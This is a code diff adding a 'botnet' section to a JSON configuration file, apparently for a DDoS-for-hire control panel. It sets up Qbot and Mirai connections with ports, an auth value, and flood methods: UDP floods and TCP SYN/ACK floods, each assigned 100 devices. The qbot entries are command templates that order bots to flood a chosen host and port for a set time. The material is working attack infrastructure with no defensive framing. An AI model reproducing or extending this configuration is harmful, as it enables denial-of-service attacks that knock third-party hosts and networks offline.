@@ -109,5 +109,54 @@
                 }
             }
         ]
+    },
+    "botnet":{
+        "qbot":{
+            "enabled":true,
+            "port":123,
+            "methods":[
+                {
+                    "name":"udp",
+                    "command":"!* udp <<$host>> <<$port>> <<$time>> 1024 1",
+                    "devices":100
+                },
+                {
+                    "name":"tcp",
+                    "command":"!* tcp <<$host>> <<$port>> <<$time>>",
+                    "devices":100
+                }
+
+            ]
+        },
+        "mirai":{
+            "enabled":true,
+
+            "-Comment- Remove this line" : "If you don't know what this does below do not change it!",
+            "auth":[
+                0,0,0,4
+            ],
+
+            "port":321,
+            "methods":[
+                {
+                    "name":"udp",
+                    "id":0,
+                    "devices":100,
+                    "flags":{
+                        "len":1024
+                    }
+                },
+                {
+                    "name":"tcp",
+                    "id":2,
+                    "devices":100,
+                    "flags":{
+                        "syn":true,
+                        "ack":true
+                    }
+                }
+            ]
+
+        }
     }
 }
